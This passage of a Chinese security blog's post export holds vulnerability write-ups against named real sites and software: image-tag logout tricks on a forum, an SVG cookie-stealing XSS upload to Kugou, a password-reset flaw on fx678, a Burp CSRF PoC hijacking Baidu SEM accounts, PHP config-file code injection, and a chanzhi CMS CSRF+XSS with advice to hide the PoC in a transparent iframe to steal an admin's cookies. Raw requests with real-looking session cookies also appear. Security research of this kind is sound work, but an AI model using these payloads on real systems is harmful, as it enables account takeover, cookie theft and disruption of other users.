1[img&#x3D;120,120]https:&#x2F;&#x2F;bbs.ichunqiu.com&#x2F;uc_server&#x2F;avatar.php?uid&#x3D;340720&amp;size&#x3D;middle&amp;a&#x3D;alert(1)[&#x2F;img] 如下 然后再次访问 https://bbs.ichunqiu.com/thread-46084-1-1.html 可以看到加载了，那么刷新一下~ 那么，我如果想恶意破坏的话，我可以在每个文章那里加上这个代码（评论），导致每个看文章的人无法正常访问I春秋~~ 漏洞案例复现利用条件： 1、退出的Url没有Token等验证2、可以有或者其他加载资源的标签 首先，知道某网站的退出链接是http://www.xxx.com/exit。 那么我们可以去找到论坛留言处、头像处、背景图片处将Url设置为http://www.xxx.com/exit，那么当用户每次访问的时候都会退出。如下是一个漏洞案例 1、打开Url：http://xxxxxx/forum.php?id=马赛克 （随便找的一个帖子），然后评论一下，并且抓包加入恶意代码，如下 加入的代码是 [img]http://xxxxxx/logout?client_id=1[/img] 2、然后打开帖子 可以看到已经退出了~ 利用思路 上面是一个利用思路，但是这个只是评论处的利用，其实还有很多可以，如下几列 1、可以利用Csrf漏洞结合，把头像、个人背景等img的地址修改为退出url2、利用越权改头像把图片地址改成退出地址，然后其他用户一登录就退出，增加危害~3、有些网站聊天处可以发图片，那么可以发送一个退出Url给他，导致退出（单次的，低危害） 思路扩展1、有个get请求的csrf，但是严格的验证了referer为www.a.com，那么可以在www.a.com中插入一个外链，然后把外链地址改为get请求的csrf地址，就可以绕过。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"代码审计分析之metinfo后台getshell","slug":"代码审计分析之metinfo后台getshell","date":"2018-07-10T11:15:57.000Z","updated":"2019-12-21T11:16:36.128Z","comments":true,"path":"2018/07/10/代码审计分析之metinfo后台getshell/","link":"","permalink":"http://yoursite.com/2018/07/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%86%E6%9E%90%E4%B9%8Bmetinfo%E5%90%8E%E5%8F%B0getshell/","excerpt":"","text":"并非抄袭，而是分析（帮朋友~）。 原文地址 : http://www.91ri.org/16663.html 第一处代码分析 1$post=array('ver'=&gt;$metcms_v,'app'=&gt;$applist);2$result=curl_post($post,60);3if(link_error($result)==1)&#123;4 $results=explode('&lt;Met&gt;',$result); //下面会讲解5 file_put_contents('dlappfile.php',$results[1]); //下面会讲解6 file_put_contents('standard.php',$results[0].$results[1]); //下面会讲解 第四行：explode函数小案例： 1$str = 'iamfree1,iamfree2';2var_dump( explode(',', $str) ); 所以explode(&#39;,&#39;, $str)就是将$str中的,的内容分割为出来分别放到数组里。 第5-6行：file_put_contents函数小案例： 1file_put_contents('2018-07-10.txt', 'iamfree'); // 会在当前脚本创建一个2018-07-10.txt文件，内容为iamfree 第二处代码分析： 我做了相应的注释，如下： 1function curl_post($post,$timeout)&#123;23 global $met_weburl,$met_host,$met_file;4 5 $host=$met_host;6 $file=$met_file;7 8 if(get_extension_funcs('curl')&amp;&amp;function_exists('curl_init')&amp;&amp;function_exists('curl_setopt')&amp;&amp;function_exists('curl_exec')&amp;&amp;function_exists('curl_close')) &#123;9 10 // 这个if判断是否可以用curl、curl_init、curl_setopt、curl_exec、ecurl_close，如果可用，就执行下面的操作11 12 $curlHandle=curl_init();13 14 curl_setopt($curlHandle,CURLOPT_URL,'http://'.$host.$file); // CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。15 16 curl_setopt($curlHandle,CURLOPT_REFERER,$met_weburl); //CURLOPT_REFERER：在HTTP请求头中\"Referer: \"的内容。17 18 curl_setopt($curlHandle,CURLOPT_RETURNTRANSFER,1);// CURLOPT_RETURNTRANSFER：在启用CURLOPT_RETURNTRANSFER的时候，返回原生的（Raw）输出。19 20 curl_setopt($curlHandle,CURLOPT_CONNECTTIMEOUT,$timeout); //CURLOPT_CONNECTTIMEOUT：在发起连接前等待的时间，如果设置为0，则无限等待。21 22 curl_setopt($curlHandle,CURLOPT_TIMEOUT,$timeout); //CURLOPT_TIMEOUT：设置cURL允许执行的最长秒数。23 24 curl_setopt($curlHandle,CURLOPT_POST, 1); // CURLOPT_POST：启用时会发送一个常规的POST请求，类型为：application/x-www-form-urlencoded，就像表单提交的一样。25 26 curl_setopt($curlHandle,CURLOPT_POSTFIELDS, $post); // CURLOPT_POSTFIELDS：全部数据使用HTTP协议中的\"POST\"操作来发送。要发送文件，在文件名前面加上@前缀并使用完整路径。这个参数可以通过urlencoded后的字符串类似'para1=val1&amp;para2=val2&amp;...'或使用一个以字段名为键值，字段数据为值的数组。如果value是一个数组，Content-Type头将会被设置成multipart/form-data27 28 $result=curl_exec($curlHandle); // 执行29 30 var_dump($result);31 curl_close($curlHandle); 32 33 &#125; standard.php文件的代码： 1metinfo23&lt;Met&gt;45&lt;?php67echo \"Joseph\";89?&gt;1011&lt;Met&gt;1213&lt;?php1415echo \"&lt;?php phpinfo();?&gt;\";1617?&gt; 疑问：这里为什么要有&lt;Met&gt;呢？ 我也不饶圈子了下面是解答 解答： 完成，下面的很简单了，不用再讲了(不要问我为什么不自己审计一个，而是去分析别人的，我是不会告诉你我审计不出漏洞的)~","categories":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"联想乐问吧某处设计不当可使用户打开网站慢","slug":"联想乐问吧某处设计不当可使用户打开网站慢","date":"2018-06-21T04:28:40.000Z","updated":"2019-12-31T04:31:41.419Z","comments":true,"path":"2018/06/21/联想乐问吧某处设计不当可使用户打开网站慢/","link":"","permalink":"http://yoursite.com/2018/06/21/%E8%81%94%E6%83%B3%E4%B9%90%E9%97%AE%E5%90%A7%E6%9F%90%E5%A4%84%E8%AE%BE%E8%AE%A1%E4%B8%8D%E5%BD%93%E5%8F%AF%E4%BD%BF%E7%94%A8%E6%88%B7%E6%89%93%E5%BC%80%E7%BD%91%E7%AB%99%E6%85%A2/","excerpt":"","text":"影响用户打开，单单只是用户浏览器加载慢，而不是导致服务器CPU上升等 1、打开Url：http://ask.lenovomobile.com/?q-628209.html 2、选择在线视频，修改视频大小~ 3、查看打开速度 总之就是过了很久还没打开好。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"酷狗图片解析漏洞","slug":"酷狗图片解析漏洞","date":"2018-06-21T04:05:53.000Z","updated":"2019-12-31T04:07:37.556Z","comments":true,"path":"2018/06/21/酷狗图片解析漏洞/","link":"","permalink":"http://yoursite.com/2018/06/21/%E9%85%B7%E7%8B%97%E5%9B%BE%E7%89%87%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"1、打开Url：http://www.kugou.com/newuc/user/uc/type=avatar 2、点击浏览然后上传图片，并且抓包，抓取后加入恶意代码 1POST &#x2F;newuc&#x2F;user&#x2F;do&#x2F;type&#x3D;1 HTTP&#x2F;1.12Host: www.kugou.com3User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;47.0.2526.73 Safari&#x2F;537.364Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.85Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.36Accept-Encoding: gzip, deflate7DNT: 18Cookie: 这是马赛克;9Connection: close10Referer: http:&#x2F;&#x2F;www.kugou.com&#x2F;newuc&#x2F;static&#x2F;swf&#x2F;ImagesUpload.swf?img&#x3D;http:&#x2F;&#x2F;imge.kugou.com&#x2F;kugouicon&#x2F;165&#x2F;20180827&#x2F;20180827215721947390.jpg&amp;w&#x3D;165&amp;h&#x3D;165&amp;t&#x3D;20140305154411Content-type: application&#x2F;octet-stream12Content-Length: 441314&lt;svg&#x2F;onload&#x3D;alert(&#39;cookie&#39;+document.cookie)&gt; 然后获取到图片的名字后拼接起来就到了这个Urlhttp://imge.kugou.com/kugouicon/165/20180828/20180828122550814765.jpg，然后在后面加上.html，变成如下Url 1http:&#x2F;&#x2F;imge.kugou.com&#x2F;kugouicon&#x2F;165&#x2F;20180828&#x2F;20180828122550814765.jpg.html 成功执行Html代码 然后来搞个恶作剧~，访问Url 1http:&#x2F;&#x2F;imge.kugou.com&#x2F;kugouicon&#x2F;165&#x2F;20180828&#x2F;20180828122755986316.jpg.txt 别人还以为我拿shell呢，哈哈哈哈","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"汇通网存在cookie混淆导致任意用户密码重置","slug":"汇通网存在cookie混淆导致任意用户密码重置","date":"2018-06-17T03:51:49.000Z","updated":"2019-12-31T03:57:45.649Z","comments":true,"path":"2018/06/17/汇通网存在cookie混淆导致任意用户密码重置/","link":"","permalink":"http://yoursite.com/2018/06/17/%E6%B1%87%E9%80%9A%E7%BD%91%E5%AD%98%E5%9C%A8cookie%E6%B7%B7%E6%B7%86%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/","excerpt":"","text":"1、打开Url：https://member.fx678.com/ResetPwd_1.html，然后输入正确的手机号码，会来到第二个url 2、来到第二步，同样正确的输入验证码来到第三步 3、然后重新打开Url：https://member.fx678.com/UserInfo/resetPwd_1，然后输入任意用户手机 4、然后会回到 https://member.fx678.com/UserInfo/resetPwd_2 5、然后回到第二步的那个链接把密码输入为 1123456free 然后提交 然后用账号18888888888、密码123456free就可以登陆~","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"百度认证存在逻辑缺陷和csrf漏洞结合导致点击后就能登陆用户账号","slug":"百度认证存在逻辑缺陷和csrf漏洞结合导致点击后就能登陆用户账号","date":"2018-06-11T04:25:52.000Z","updated":"2019-12-31T04:26:31.209Z","comments":true,"path":"2018/06/11/百度认证存在逻辑缺陷和csrf漏洞结合导致点击后就能登陆用户账号/","link":"","permalink":"http://yoursite.com/2018/06/11/%E7%99%BE%E5%BA%A6%E8%AE%A4%E8%AF%81%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E5%92%8Ccsrf%E6%BC%8F%E6%B4%9E%E7%BB%93%E5%90%88%E5%AF%BC%E8%87%B4%E7%82%B9%E5%87%BB%E5%90%8E%E5%B0%B1%E8%83%BD%E7%99%BB%E9%99%86%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7/","excerpt":"","text":"利用低危漏洞结合成高风险漏洞 1、打开Url：http://sem.baidu.com/site/index 2、提交后抓包，抓取的数据包如下： 1POST &#x2F;site&#x2F;index HTTP&#x2F;1.12Host: sem.baidu.com3User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; rv:36.0) Gecko&#x2F;20100101 Firefox&#x2F;36.044Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.85Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.36Accept-Encoding: gzip, deflate7DNT: 18Referer: http:&#x2F;&#x2F;sem.baidu.com&#x2F;site&#x2F;index9Cookie: BAIDUID&#x3D;8714ADD7CB5329A63EC76292F17846A6:FG&#x3D;1; BIDUPSID&#x3D;4F674276B62C7A0ED6353C847FA35FA6; PSTM&#x3D;1522409414; BDUSS&#x3D;Td1QUN5Um4xVXJiNy1ueUc1U3NPS2JUSklJNDhDZmdidTRTdUpSUnZZc3FmSFZiQVFBQUFBJCQAAAAAAAAAAAEAAACdXIJwac34wue28cSnaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACrvTVsq701bO; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; Hm_lvt_f4165db5a1ac36eadcfa02a10a6bd243&#x3D;1531993906; __cfduid&#x3D;d18077ae0d5ba2463f04f4ce5eff2d4201531995564; yunsuo_session_verify&#x3D;dd553c99f83d5260367c8c46500dfd3c; yjs_id&#x3D;86deb3b7eacd9b9bb1ed6c51678b0fa8; ctrl_time&#x3D;1; Hm_lvt_340648ab5ac20fe131ac165c13a6c5d5&#x3D;1531995566; PHPSESSID&#x3D;ltftf3m1i5f8f2r53qqmemcrv2; _csrf&#x3D;1f3894e48cb8b9f149349064d417ee615a03efdef2ef073bdbf1e42425629e26s%3A32%3A%22djesyKQK8ckeXOomBlYF9CcvTyfXtJlW%22%3B; Hm_lpvt_340648ab5ac20fe131ac165c13a6c5d5&#x3D;1532009894; H_PS_PSSID&#x3D;26523_1421_26431_21124_26350_22159; BDRCVFR[feWj1Vr5u3D]&#x3D;mbxnW11j9Dfmh7GuZR8mvqV; PSINO&#x3D;7; Hm_lpvt_f4165db5a1ac36eadcfa02a10a6bd243&#x3D;1531993906; webexn&#x3D;YYUSS-USERACTION; YYUSS&#x3D;1027c5d2be4d3bb435a715687df13037; USERACTION&#x3D;INPUT_NEW_QUESTION10Connection: close11Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------106674792866812Content-Length: 26221314-----------------------------106674792866815Content-Disposition: form-data; name&#x3D;&quot;_csrf&quot;1617OGVaZUZQZHVcDz8WPxs1PgAGMQAeHwsYegkDI38TBwNsHDw9MhoIIg&#x3D;&#x3D;18-----------------------------106674792866819Content-Disposition: form-data; name&#x3D;&quot;id&quot;2021587569422-----------------------------106674792866823Content-Disposition: form-data; name&#x3D;&quot;User[email]&quot;24251900065568@qq.com26-----------------------------106674792866827Content-Disposition: form-data; name&#x3D;&quot;User[real_name]&quot;282930-----------------------------106674792866831Content-Disposition: form-data; name&#x3D;&quot;User[birth_day]&quot;323334-----------------------------106674792866835Content-Disposition: form-data; name&#x3D;&quot;User[gender]&quot;3637038-----------------------------106674792866839Content-Disposition: form-data; name&#x3D;&quot;User[tel_mobile]&quot;4041my phone42-----------------------------106674792866843Content-Disposition: form-data; name&#x3D;&quot;User[tel_office]&quot;444546-----------------------------106674792866847Content-Disposition: form-data; name&#x3D;&quot;User[province]&quot;484950-----------------------------106674792866851Content-Disposition: form-data; name&#x3D;&quot;User[city]&quot;525354-----------------------------106674792866855Content-Disposition: form-data; name&#x3D;&quot;User[address]&quot;565758-----------------------------106674792866859Content-Disposition: form-data; name&#x3D;&quot;User[province_cons]&quot;606162-----------------------------106674792866863Content-Disposition: form-data; name&#x3D;&quot;User[city_cons]&quot;646566-----------------------------106674792866867Content-Disposition: form-data; name&#x3D;&quot;User[id_kind]&quot;6869170-----------------------------106674792866871Content-Disposition: form-data; name&#x3D;&quot;User[institution_name]&quot;727374-----------------------------106674792866875Content-Disposition: form-data; name&#x3D;&quot;User[position]&quot;767778-----------------------------106674792866879Content-Disposition: form-data; name&#x3D;&quot;User[uc_id]&quot;808182-----------------------------106674792866883Content-Disposition: form-data; name&#x3D;&quot;User[hi]&quot;848586-----------------------------106674792866887Content-Disposition: form-data; name&#x3D;&quot;User[qq]&quot;888990-----------------------------106674792866891Content-Disposition: form-data; name&#x3D;&quot;User[msn]&quot;929394-----------------------------106674792866895Content-Disposition: form-data; name&#x3D;&quot;User[weibo]&quot;969798-----------------------------106674792866899Content-Disposition: form-data; name&#x3D;&quot;User[homePage]&quot;100101102-----------------------------1066747928668103Content-Disposition: form-data; name&#x3D;&quot;User[user_detail]&quot;104105106-----------------------------1066747928668107Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;&quot;108Content-Type: application&#x2F;octet-stream109110111-----------------------------1066747928668-- 3、构造漏洞利用思路 首先，在找回密码的时候存在这些数据 所以，如果我们可以将用户的用户名修改为攻击者设定的，邮箱修改为攻击者设定的，就可以修改任意用户账号的密码~ 4、简化数据包 1POST &#x2F;site&#x2F;index HTTP&#x2F;1.12Host: sem.baidu.com3User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; rv:36.0) Gecko&#x2F;20100101 Firefox&#x2F;36.044Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.85Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.36Accept-Encoding: gzip, deflate7DNT: 18Referer: http:&#x2F;&#x2F;sem.baidu.com&#x2F;site&#x2F;index9Cookie: BAIDUID&#x3D;8714ADD7CB5329A63EC76292F17846A6:FG&#x3D;1; BIDUPSID&#x3D;4F674276B62C7A0ED6353C847FA35FA6; PSTM&#x3D;1522409414; BDUSS&#x3D;Td1QUN5Um4xVXJiNy1ueUc1U3NPS2JUSklJNDhDZmdidTRTdUpSUnZZc3FmSFZiQVFBQUFBJCQAAAAAAAAAAAEAAACdXIJwac34wue28cSnaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACrvTVsq701bO; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; Hm_lvt_f4165db5a1ac36eadcfa02a10a6bd243&#x3D;1531993906; __cfduid&#x3D;d18077ae0d5ba2463f04f4ce5eff2d4201531995564; yunsuo_session_verify&#x3D;dd553c99f83d5260367c8c46500dfd3c; yjs_id&#x3D;86deb3b7eacd9b9bb1ed6c51678b0fa8; ctrl_time&#x3D;1; Hm_lvt_340648ab5ac20fe131ac165c13a6c5d5&#x3D;1531995566; PHPSESSID&#x3D;ltftf3m1i5f8f2r53qqmemcrv2; _csrf&#x3D;1f3894e48cb8b9f149349064d417ee615a03efdef2ef073bdbf1e42425629e26s%3A32%3A%22djesyKQK8ckeXOomBlYF9CcvTyfXtJlW%22%3B; Hm_lpvt_340648ab5ac20fe131ac165c13a6c5d5&#x3D;1532009894; H_PS_PSSID&#x3D;26523_1421_26431_21124_26350_22159; BDRCVFR[feWj1Vr5u3D]&#x3D;mbxnW11j9Dfmh7GuZR8mvqV; PSINO&#x3D;7; Hm_lpvt_f4165db5a1ac36eadcfa02a10a6bd243&#x3D;1531993906; webexn&#x3D;YYUSS-USERACTION; YYUSS&#x3D;1027c5d2be4d3bb435a715687df13037; USERACTION&#x3D;INPUT_NEW_QUESTION10Connection: close11Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------106674792866812Content-Length: 2651314-----------------------------106674792866815Content-Disposition: form-data; name&#x3D;&quot;User[email]&quot;1617baidu@baidu.com18-----------------------------106674792866819Content-Disposition: form-data; name&#x3D;&quot;User[name]&quot;2021csrf_test22-----------------------------1066747928668 我把_Csrf(这个并没有验证)和其他一些没用的数据删除了，并且加上了User[name]参数(自己添加的，表示用户名)。 5、生成为Csrf Poc 那么用户名和邮箱都可控，那么就来狗仔为Csrf Poc 1&lt;html&gt;2 &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;3 &lt;body&gt;4 &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;5 &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;sem.baidu.com&#x2F;site&#x2F;index&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;6 &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;User&amp;#91;email&amp;#93;&quot; value&#x3D;&quot;baidu&amp;#64;baidu&amp;#46;com&quot; &#x2F;&gt;7 &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;User&amp;#91;name&amp;#93;&quot; value&#x3D;&quot;csrf&amp;#95;test&quot; &#x2F;&gt;8 &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt;9 &lt;&#x2F;form&gt;10 &lt;&#x2F;body&gt;11&lt;&#x2F;html&gt; 6、在浏览器处打开Poc 成功被修改~ 7、再次查看忘记密码 ok，那么如果用户打开我的csrf poc，我就可以重置他信息，并且这里还可以让这个用户没办法再登陆这个账号~ 对吧 (●’◡’●)","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"代码审计之php in_array函数缺陷","slug":"代码审计之in-array函数缺陷","date":"2018-05-23T07:03:41.000Z","updated":"2019-12-21T11:05:54.807Z","comments":true,"path":"2018/05/23/代码审计之in-array函数缺陷/","link":"","permalink":"http://yoursite.com/2018/05/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bin-array%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/","excerpt":"","text":"这篇文章是选与红日安全网出品的，这里只是来实际操作并且总结简化一下~原文地址：https://xz.aliyun.com/t/2451 函数介绍首先先来讲解函数的用法 然后执行一下这个脚本 返回的是no，如果代码是 返回的结果是yes 那么这个函数应该很容易明白了，就是说如果$name的值在第二个参数里（也就是对比是否在数组里的元素）返回true如果不在，返回false 一般的实现的功能这个函数一般是用于上传文件的时候，获取文件名后缀，然后对比一下是否在白名单或者黑名单，如下代码 打开页面，并且传递内容fn=index.php看看页面返回什么内容 然后我们传入正常的文件名试试","categories":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"php_int绕过获取flag","slug":"php-int绕过获取flag","date":"2018-05-22T11:03:41.000Z","updated":"2019-12-21T11:04:11.714Z","comments":true,"path":"2018/05/22/php-int绕过获取flag/","link":"","permalink":"http://yoursite.com/2018/05/22/php-int%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96flag/","excerpt":"","text":"代码是这样的（加了注释的） 1&lt;?php2$flag = \"66666\";3if(isset($_GET['time']))&#123; // 如果get请求中存在time参数4 if(!is_numeric($_GET['time']))&#123; // 如果非数字5 echo 'The time must be number.'; 6 &#125;else if($_GET['time'] &lt; 60 * 60 * 24 * 30 * 2)&#123; // 如果time小于xx7 echo 'This time is too short.'; 8 &#125;else if($_GET['time'] &gt; 60 * 60 * 24 * 30 * 3)&#123; // 如果time大于xx9 echo 'This time is too long.'; 10 &#125;else&#123; // 否则11 sleep((int)$_GET['time']); // 睡眠time秒12 echo $flag; // 睡眠结束后输出flag13 &#125; 14&#125; 在注释中很详细的讲解了 如果想要输出$flag就必须绕过这3个if条件判断才能到else 然后才会输出$flag，那么我们来看看如何才能不达到这几个if条件语句 第一个if条件1if(!is_numeric($_GET['time'])) 如果$_GET[&#39;time&#39;]的值不是数字，则会触发这个if条件 第二个if条件1else if($_GET['time'] &lt; 60 * 60 * 24 * 30 * 2) 如果$_GET[&#39;time&#39;]的值小于60 * 60 * 24 * 30 * 2，则触发这个if条件，那么我们来看看这个数值有多大 15184000 然后再来看看第三个if条件 1else if($_GET['time'] &gt; 60 * 60 * 24 * 30 * 3 如果$_GET[&#39;time&#39;]的值大于60 * 60 * 24 * 30 * 3，则触发这个if条件，那么来看看这个有多大 17776000 那么要逃逸这2个if条件很简单，只要$_GET[&#39;time&#39;]大于5184000并且小于7776000就可以获取到flag，但是我们看一下else里面的代码 1sleep((int)$_GET['time']); // 睡眠time秒2echo $flag; // 睡眠结束后输出flag 那么我们如果把time的值填的符合上面那么大的值，估计我孩子都生出来了。。。，那么该肿么办呢，之前看过一篇文章有讲过，测试代码如下 1&lt;?php23$num = $_GET['num']; // 接收get请求中的num参数4if ($num &gt; 9999)&#123; // 如果num大于99995 echo '$temp &gt; 9999'; // 输出 $temp &gt; 99996&#125;7echo \"&lt;br&gt;\";8var_dump( (int)$num ); // 打印转换$num的值 那么我们来访问以下?num=0x2710 what?为啥会显示大于9999最后又输出结果是0呢？下面来看下讲解 这里的0x2710是10000转换为十六进制后的值 然后我们再来看个小案例 1var_dump( (int)('0only_free') ); 可以看到0only_free在int转换后变成了0 可以理解为int就是取一个有数字、字母的字符串的前面数字。 那么我们可以利用这个办法去绕过上面的2个if判断，直接访问一下 1http:&#x2F;&#x2F;you_url.xxx&#x2F;xxx.php?time&#x3D;0x4f1a01 ok，成功绕过并且输出了flag","categories":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"php配置文件写入执行代码","slug":"php配置文件写入执行代码","date":"2018-05-21T11:01:43.000Z","updated":"2019-12-21T11:02:38.169Z","comments":true,"path":"2018/05/21/php配置文件写入执行代码/","link":"","permalink":"http://yoursite.com/2018/05/21/php%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/","excerpt":"","text":"项目地址：https://github.com/CHYbeta/Code-Audit-Challenges#php index.php1&lt;?php23$str = addslashes($_GET['option']); // 对option参数进行单引号过滤4$file = file_get_contents('xxxxx/option.php'); // 读取xxxxx下面的option.php的内容5$file = preg_replace('|\\$option=\\'.*\\';|', \"\\$option='$str';\", $file); // 把$file读取的内容中的$option=xxxx;替换为$option='$str'6file_put_contents('xxxxx/option.php', $file); // 然后把$file变量再写入到option.php文件 option.php1&lt;?php23$option='test'; 那么这个是需要我们可以执行代码，那么该如何呢？ 目前想到的办法只有把index.php中写入option.php的值修改为恶意的代码才能执行~ 但是这里把单引号过滤了所以我们能利用如下这个办法绕过，先看下小案例 1&lt;?php23$str&#x3D;&#39;123321\\\\&#39;;4phpinfo(); 可以看到2个\\\\符号是可以让&#39;成功变成是&#39;单引号的，那么这样是可以成功逃逸单引号限制的，所以我们可以利用这个办法来绕过，访问如下 1?option&#x3D;1\\&#39;;%0aphpinfo();&#x2F;&#x2F; 然后写入php后会变成这样 1$option&#x3D;&#39;1\\\\&#39;;2phpinfo();&#x2F;&#x2F;&#39;; 解释：因为&#39;会变成\\&#39;那么，只要在单引号前面加上\\就变成\\\\&#39;成功逃逸单引号，然后%0a写入后变成空行，然后把后面多余的符号给注释了，否则会报错 然后我们来访问一下 还有一个办法也可以绕过 首先我们来访问 1?option&#x3D;123&#39;;%0aphpinfo();&#x2F;&#x2F; 然后代码会变成 1$option='123\\';2phpinfo();//'; 但是这个时候是无法执行phpinfo函数的，因为$option变量后面没有单引号，所以等于第二行也是$option变量值 那么我们可以再去访问一下 1?option&#x3D;666 然后代码变成如下","categories":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"对chanzhi企业门户系统的一次测试","slug":"对chanzhi企业门户系统的一次测试","date":"2018-04-18T07:17:18.000Z","updated":"2019-12-18T01:19:30.657Z","comments":true,"path":"2018/04/18/对chanzhi企业门户系统的一次测试/","link":"","permalink":"http://yoursite.com/2018/04/18/%E5%AF%B9chanzhi%E4%BC%81%E4%B8%9A%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/","excerpt":"","text":"依稀记得，这是我挖的第一个漏洞，非常怀念。 系统官网:http://www.chanzhi.org/?v=7.0.1安装步骤之类的就省去了，直接开始测试 Csrf+Xss漏洞漏洞复现过程：漏洞处:后台-&gt;内容-&gt;维护目录( www.yousite.xxx/www/admin.php?m=tree&amp;f=browse&amp;type=article ) 尝试输入一些恶意代码:这里因为发现没有过滤，所以存在Xss漏洞，但是这里我们是不可能插入的(除非管理员自己插入的，那么，我们就来看看有没有Csrf漏洞可以结合一下)，然后就想着用Burp抓包分析一下，发现有戏~ 用Burp抓包分析一波，并且放入Repeater模块这里并没有发现有Token验证，那么我们来利用Burp自带的生成Csrf Poc 右键-&gt;Engagement tools-&gt;Generate Csrf PoC 自动写出PoC，我们直接复制到本地的HTML文件里 在浏览器中打开这个生成的PoC ok，存在Csrf漏洞 我们可以利用社工来把这个文件发送给管理员，如果管理员选择了打开的话那么就可以盗取他的Cookie了，那么很多人会问，管理员看到这样的界面肯定会不点击啦，那么我给你一个思路，就是把csrf_poc的代码放在 1.html 文件( 把点击提交修改为自动提交 )，然后把2.html文件用 iframe标签把 1.html 文件嵌入 并且把iframe标签透明度设置为100%，那么管理员打开后就会自动提交表单并且不会展示在2.html页面上~ 